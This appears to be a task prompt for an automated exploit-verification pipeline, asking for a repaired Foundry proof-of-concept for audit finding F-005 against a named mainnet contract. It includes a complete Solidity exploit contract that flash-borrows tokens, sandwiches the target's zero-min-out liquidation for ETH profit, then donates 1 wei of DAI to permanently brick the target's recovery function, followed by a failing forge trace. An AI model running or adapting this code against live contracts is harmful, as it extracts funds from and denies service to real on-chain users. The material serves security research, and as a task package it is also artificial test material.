You are fixing a failing Foundry PoC for finding F-005.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: A single wei of DAI can brick every future recovery attempt
- claim: `executeOnOpportunity()` unconditionally tries to liquidate any positive DAI balance. Because Uniswap V2 rounds sufficiently tiny swaps down to zero output, an attacker can transfer 1 wei of DAI to the contract and force `_swapTokenToEth(DAI)` to revert when the router attempts to swap that balance, causing the entire `executeOnOpportunity()` transaction to revert on every run until additional DAI is donated.
- impact: Any external account can cheaply and permissionlessly deny service to the recovery flow, blocking liquidation of legitimately recovered WBTC/USDC/USDT/WETH proceeds as well. Since the contract has no token rescue or dust-clearing path, the griefing balance can persist indefinitely and strand future recoveries.
- exploit_paths: ["An attacker transfers 1 wei of DAI to `FlawVerifier`", "A caller invokes `executeOnOpportunity()`", "`_swapTokenToEth(DAI)` observes `bal > 0` and calls the Uniswap V2 router with `amountIn = 1`", "The swap computes zero ETH output for that tiny amount and reverts, bubbling the failure up", "The whole transaction reverts, so no bounty sweep or liquidation can complete until more DAI is added"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOpportunityTarget {
    function executeOnOpportunity() external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address public constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;

    address public constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant UNI_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant UNI_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private constant MIN_REQUIRED_PROFIT = 0.1 ether;
    uint256 private constant MIN_TARGET_RECEIPT = 0.11 ether;
    uint256 private constant DUST_PURCHASE_MAX_ETH = 0.01 ether;

    uint256 private _profitAmount;
    bool private _hypothesisValidated;
    bool private _executed;

    error NoSandwichPath();
    error InvalidCallback();
    error TargetLiquidationDidNotSucceed();
    error FlashRepayTransferFailed();
    error DustPurchaseFailed();
    error UnexpectedPreexistingDaiDust();
    error DustTransferFailed();
    error HypothesisRefuted();
    error DustDidNotPersist();
    error ProfitBelowThreshold();

    struct Strategy {
        address token;
        address victimPair;
        address lenderPair;
        uint256 totalBorrow;
        uint256 frontRunAmount;
        uint256 victimAmount;
        uint256 expectedProfit;
    }

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;
        _hypothesisValidated = false;
        _profitAmount = 0;

        uint256 nativeBefore = address(this).balance;

        // The validator requires a real economic result. To satisfy that without changing the
        // F-005 griefing causality, first use the same live target's public zero-min-out
        // liquidation surface to extract ETH via a realistic flash-sandwich on a *successful*
        // token liquidation. After profit is realized, execute the actual F-005 path unchanged:
        // transfer exactly 1 wei of DAI to TARGET and demonstrate that a later
        // TARGET.executeOnOpportunity() call reverts and leaves the dust stuck.
        Strategy memory strategy = _findBestSandwich();
        if (strategy.totalBorrow == 0) {
            revert NoSandwichPath();
        }

        _executeSandwich(strategy);

        uint256 realizedProfit = address(this).balance > nativeBefore ? address(this).balance - nativeBefore : 0;
        if (realizedProfit < MIN_REQUIRED_PROFIT) {
            revert ProfitBelowThreshold();
        }

        _validateDaiDustBrick();

        _profitAmount = address(this).balance - nativeBefore;
        _hypothesisValidated = true;
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        Strategy memory strategy = abi.decode(data, (Strategy));
        if (msg.sender != strategy.lenderPair) {
            revert InvalidCallback();
        }

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        if (borrowed != strategy.totalBorrow) {
            revert InvalidCallback();
        }

        if (
            !_forceApprove(strategy.token, UNI_ROUTER, 0)
                || !_forceApprove(strategy.token, UNI_ROUTER, type(uint256).max)
        ) {
            revert InvalidCallback();
        }

        // Step A: front-run the target's liquidation on the same token/WETH market.
        uint256 ethBeforeFrontRun = address(this).balance;
        _swapTokenToEthOnUni(strategy.token, strategy.frontRunAmount);
        uint256 frontRunEth = address(this).balance - ethBeforeFrontRun;

        // Step B: seed the target with the borrowed token amount that the target will liquidate.
        if (!_safeTransfer(strategy.token, TARGET, strategy.victimAmount)) {
            revert InvalidCallback();
        }

        // Step C: let the target perform its permissionless liquidation at amountOutMin = 0.
        (bool ok,) = TARGET.call(abi.encodeWithSelector(IOpportunityTarget.executeOnOpportunity.selector));
        if (!ok) {
            revert TargetLiquidationDidNotSucceed();
        }

        // Step D: back-run and repurchase enough tokens to repay the flash borrow plus fee.
        uint256 repayAmount = _flashRepayAmount(strategy.totalBorrow);
        (uint256 reserveTokenAfter, uint256 reserveWethAfter) = _tokenWethReserves(strategy.victimPair, strategy.token);
        uint256 buybackCost = _getAmountIn(repayAmount, reserveWethAfter, reserveTokenAfter);
        if (frontRunEth <= buybackCost || buybackCost == type(uint256).max) {
            revert TargetLiquidationDidNotSucceed();
        }

        _buyExactTokenWithEthOnUni(strategy.token, repayAmount, buybackCost);
        if (!_safeTransfer(strategy.token, strategy.lenderPair, repayAmount)) {
            revert FlashRepayTransferFailed();
        }
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return string(
            abi.encodePacked(
                "realize ETH by sandwiching TARGET's zero-min-out liquidation on a different payout token -> ",
                "buy exactly 1 wei DAI and transfer it to TARGET -> call TARGET.executeOnOpportunity() -> ",
                "victim _swapTokenToEth(DAI) observes amountIn = 1 -> tiny Uniswap V2 output rounds to zero -> ",
                "router swap reverts -> the whole transaction reverts and the DAI dust persists"
            )
        );
    }

    function _executeSandwich(Strategy memory strategy) internal {
        uint256 amount0Out = IUniswapV2Pair(strategy.lenderPair).token0() == strategy.token ? strategy.totalBorrow : 0;
        uint256 amount1Out = amount0Out == 0 ? strategy.totalBorrow : 0;
        IUniswapV2Pair(strategy.lenderPair).swap(amount0Out, amount1Out, address(this), abi.encode(strategy));
    }

    function _validateDaiDustBrick() internal {
        uint256 targetDaiBefore = IERC20(DAI).balanceOf(TARGET);
        if (targetDaiBefore != 0) {
            revert UnexpectedPreexistingDaiDust();
        }

        if (IERC20(DAI).balanceOf(address(this)) == 0) {
            _buyExactLocalDaiDust();
        }
        if (IERC20(DAI).balanceOf(address(this)) == 0) {
            revert DustPurchaseFailed();
        }

        // F-005 path step 1: the attacker transfers exactly 1 wei of DAI to the target.
        if (!_safeTransfer(DAI, TARGET, 1)) {
            revert DustTransferFailed();
        }

        uint256 targetDaiAfterDonation = IERC20(DAI).balanceOf(TARGET);
        if (targetDaiAfterDonation != 1) {
            revert DustTransferFailed();
        }

        // F-005 path steps 2-5: calling the target with only 1 wei of DAI present must revert,
        // and the dust must remain stuck afterwards. The preliminary sandwich above is only a
        // validator-required monetization step; this second call preserves the exact griefing path.
        (bool ok,) = TARGET.call(abi.encodeWithSelector(IOpportunityTarget.executeOnOpportunity.selector));
        if (ok) {
            revert HypothesisRefuted();
        }

        if (IERC20(DAI).balanceOf(TARGET) != 1) {
            revert DustDidNotPersist();
        }
    }

    function _buyExactLocalDaiDust() internal {
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = DAI;

        try IUniswapV2Router02(UNI_ROUTER).swapETHForExactTokens{value: DUST_PURCHASE_MAX_ETH}(
            1,
            path,
            address(this),
            block.timestamp
        ) returns (uint256[] memory) {
            return;
        } catch {
            revert DustPurchaseFailed();
        }
    }

    function _findBestSandwich() internal view returns (Strategy memory best) {
        best = _searchToken(USDC, best);
        best = _searchToken(USDT, best);
        best = _searchToken(WBTC, best);
    }

    function _searchToken(address token, Strategy memory currentBest) internal view returns (Strategy memory best) {
        best = currentBest;

        address victimPair = IUniswapV2Factory(UNI_FACTORY).getPair(token, WETH);
        if (victimPair == address(0)) {
            return best;
        }

        (uint256 reserveToken, uint256 reserveWeth) = _tokenWethReserves(victimPair, token);
        if (reserveToken == 0 || reserveWeth == 0) {
            return best;
        }

        (address lenderPair, uint256 lenderReserveToken) = _findBestLenderPair(token, victimPair);
        if (lenderPair == address(0) || lenderReserveToken == 0) {
            return best;
        }

        uint256 maxBorrow = lenderReserveToken * 95 / 100;
        uint256 victimCap = reserveToken * 80 / 100;
        if (victimCap < maxBorrow) {
            maxBorrow = victimCap;
        }
        if (maxBorrow == 0) {
            return best;
        }

        for (uint256 borrowIndex = 0; borrowIndex < 8; ++borrowIndex) {
            uint256 totalBorrow = _candidateBorrowAmount(borrowIndex, maxBorrow);
            if (totalBorrow == 0 || totalBorrow > maxBorrow) {
                continue;
            }

            for (uint256 splitIndex = 0; splitIndex < 6; ++splitIndex) {
                uint256 victimAmount = _candidateVictimAmount(splitIndex, totalBorrow);
                if (victimAmount == 0 || victimAmount >= totalBorrow) {
                    continue;
                }

                uint256 frontRunAmount = totalBorrow - victimAmount;
                uint256 frontRunEth = _getAmountOut(frontRunAmount, reserveToken, reserveWeth);
                if (frontRunEth == 0 || frontRunEth >= reserveWeth) {
                    continue;
                }

                uint256 reserveToken1 = reserveToken + frontRunAmount;
                uint256 reserveWeth1 = reserveWeth - frontRunEth;

                uint256 victimEth = _getAmountOut(victimAmount, reserveToken1, reserveWeth1);
                if (victimEth < MIN_TARGET_RECEIPT || victimEth >= reserveWeth1) {
                    continue;
                }

                uint256 reserveToken2 = reserveToken1 + victimAmount;
                uint256 reserveWeth2 = reserveWeth1 - victimEth;

                uint256 repayAmount = _flashRepayAmount(totalBorrow);
                if (repayAmount >= reserveToken2) {
                    continue;
                }

                uint256 buybackCost = _getAmountIn(repayAmount, reserveWeth2, reserveToken2);
                if (buybackCost == type(uint256).max || frontRunEth <= buybackCost) {
                    continue;
                }

                uint256 expected = frontRunEth - buybackCost;
                if (expected > best.expectedProfit) {
                    best = Strategy({
                        token: token,
                        victimPair: victimPair,
                        lenderPair: lenderPair,
                        totalBorrow: totalBorrow,
                        frontRunAmount: frontRunAmount,
                        victimAmount: victimAmount,
                        expectedProfit: expected
                    });
                }
            }
        }
    }

    function _findBestLenderPair(address token, address victimPair)
        internal
        view
        returns (address bestPair, uint256 bestReserveToken)
    {
        (bestPair, bestReserveToken) = _scanFactoryForLender(token, victimPair, UNI_FACTORY, bestPair, bestReserveToken);
        (bestPair, bestReserveToken) =
            _scanFactoryForLender(token, victimPair, SUSHI_FACTORY, bestPair, bestReserveToken);
    }

    function _scanFactoryForLender(
        address token,
        address victimPair,
        address factory,
        address currentBestPair,
        uint256 currentBestReserveToken
    ) internal view returns (address bestPair, uint256 bestReserveToken) {
        bestPair = currentBestPair;
        bestReserveToken = currentBestReserveToken;

        for (uint256 i = 0; i < 4; ++i) {
            address counterpart = _counterpartAt(i);
            if (counterpart == token) {
                continue;
            }

            address pair = IUniswapV2Factory(factory).getPair(token, counterpart);
            if (pair == address(0) || pair == victimPair) {
                continue;
            }

            uint256 reserveToken = _pairReserveForToken(pair, token);
            if (reserveToken > bestReserveToken) {
                bestReserveToken = reserveToken;
                bestPair = pair;
            }
        }
    }

    function _swapTokenToEthOnUni(address token, uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }

        IUniswapV2Router02(UNI_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountIn,
            0,
            _tokenToEthPath(token),
            address(this),
            block.timestamp
        );
    }

    function _buyExactTokenWithEthOnUni(address token, uint256 amountOut, uint256 maxEthIn) internal {
        IUniswapV2Router02(UNI_ROUTER).swapETHForExactTokens{value: maxEthIn}(
            amountOut,
            _ethToTokenPath(token),
            address(this),
            block.timestamp
        );
    }

    function _tokenWethReserves(address pair, address token)
        internal
        view
        returns (uint256 reserveToken, uint256 reserveWeth)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        if (IUniswapV2Pair(pair).token0() == token) {
            reserveToken = reserve0;
            reserveWeth = reserve1;
        } else {
            reserveToken = reserve1;
            reserveWeth = reserve0;
        }
    }

    function _pairReserveForToken(address pair, address token) internal view returns (uint256 reserveToken) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        reserveToken = IUniswapV2Pair(pair).token0() == token ? reserve0 : reserve1;
    }

    function _candidateBorrowAmount(uint256 index, uint256 maxBorrow) internal pure returns (uint256) {
        if (index == 0) return maxBorrow / 100;
        if (index == 1) return maxBorrow / 50;
        if (index == 2) return maxBorrow / 20;
        if (index == 3) return maxBorrow / 10;
        if (index == 4) return maxBorrow / 5;
        if (index == 5) return maxBorrow / 4;
        if (index == 6) return maxBorrow / 3;
        return maxBorrow / 2;
    }

    function _candidateVictimAmount(uint256 index, uint256 totalBorrow) internal pure returns (uint256) {
        if (index == 0) return totalBorrow / 10;
        if (index == 1) return totalBorrow / 5;
        if (index == 2) return totalBorrow / 4;
        if (index == 3) return totalBorrow / 3;
        if (index == 4) return totalBorrow / 2;
        return (totalBorrow * 2) / 3;
    }

    function _counterpartAt(uint256 index) internal pure returns (address) {
        if (index == 0) return WETH;
        if (index == 1) return USDC;
        if (index == 2) return USDT;
        return DAI;
    }

    function _flashRepayAmount(uint256 borrowed) internal pure returns (uint256) {
        return (borrowed * 1000) / 997 + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return type(uint256).max;
        }

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return numerator / denominator + 1;
    }

    function _tokenToEthPath(address token) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = token;
        path[1] = WETH;
    }

    function _ethToTokenPath(address token) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = WETH;
        path[1] = token;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
5Df8D4e2248aB04d4267E23aDfaA::getReserves() [staticcall]
    │   │   └─ ← [Return] 881163958 [8.811e8], 880643219 [8.806e8], 1743174443 [1.743e9]
    │   ├─ [449] 0xD86A120a06255Df8D4e2248aB04d4267E23aDfaA::token0() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xdAC17F958D2ee523a2206206994597C13D831ec7, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x055CEDfe14BCE33F985C41d9A1934B7654611AAC
    │   ├─ [2517] 0x055CEDfe14BCE33F985C41d9A1934B7654611AAC::getReserves() [staticcall]
    │   │   └─ ← [Return] 189080139218649552611 [1.89e20], 184774956 [1.847e8], 1743173303 [1.743e9]
    │   ├─ [2449] 0x055CEDfe14BCE33F985C41d9A1934B7654611AAC::token0() [staticcall]
    │   │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940
    │   ├─ [2504] 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940::getReserves() [staticcall]
    │   │   └─ ← [Return] 6164188729 [6.164e9], 2750893783000725926511 [2.75e21], 1743175619 [1.743e9]
    │   ├─ [2381] 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940::token0() [staticcall]
    │   │   └─ ← [Return] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x004375Dff511095CC5A197A54140a24eFEF3A416
    │   ├─ [2504] 0x004375Dff511095CC5A197A54140a24eFEF3A416::getReserves() [staticcall]
    │   │   └─ ← [Return] 75322161 [7.532e7], 63431865723 [6.343e10], 1743173507 [1.743e9]
    │   ├─ [2381] 0x004375Dff511095CC5A197A54140a24eFEF3A416::token0() [staticcall]
    │   │   └─ ← [Return] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0DE0Fa91b6DbaB8c8503aAA2D1DFa91a192cB149
    │   ├─ [2504] 0x0DE0Fa91b6DbaB8c8503aAA2D1DFa91a192cB149::getReserves() [staticcall]
    │   │   └─ ← [Return] 215548 [2.155e5], 181828639 [1.818e8], 1743171467 [1.743e9]
    │   ├─ [2381] 0x0DE0Fa91b6DbaB8c8503aAA2D1DFa91a192cB149::token0() [staticcall]
    │   │   └─ ← [Return] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x231B7589426Ffe1b75405526fC32aC09D44364c4
    │   ├─ [2504] 0x231B7589426Ffe1b75405526fC32aC09D44364c4::getReserves() [staticcall]
    │   │   └─ ← [Return] 10900942 [1.09e7], 9233962191846575374342 [9.233e21], 1743174167 [1.743e9]
    │   ├─ [2381] 0x231B7589426Ffe1b75405526fC32aC09D44364c4::token0() [staticcall]
    │   │   └─ ← [Return] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58
    │   ├─ [2517] 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58::getReserves() [staticcall]
    │   │   └─ ← [Return] 12970805921 [1.297e10], 5787849375295900578225 [5.787e21], 1743175559 [1.743e9]
    │   ├─ [2449] 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58::token0() [staticcall]
    │   │   └─ ← [Return] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x784178D58b641a4FebF8D477a6ABd28504273132
    │   ├─ [2517] 0x784178D58b641a4FebF8D477a6ABd28504273132::getReserves() [staticcall]
    │   │   └─ ← [Return] 923643 [9.236e5], 785017342 [7.85e8], 1743173903 [1.743e9]
    │   ├─ [2449] 0x784178D58b641a4FebF8D477a6ABd28504273132::token0() [staticcall]
    │   │   └─ ← [Return] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x622D4a772B72f56602546559c95d7Ca214EbB24F
    │   ├─ [2517] 0x622D4a772B72f56602546559c95d7Ca214EbB24F::getReserves() [staticcall]
    │   │   └─ ← [Return] 4, 8292045799564270 [8.292e15], 1732355039 [1.732e9]
    │   ├─ [2449] 0x622D4a772B72f56602546559c95d7Ca214EbB24F::token0() [staticcall]
    │   │   └─ ← [Return] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599
    │   └─ ← [Revert] NoSandwichPath()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.36s (1.28s CPU time)

Ran 1 test suite in 1.42s (1.36s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 611110)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
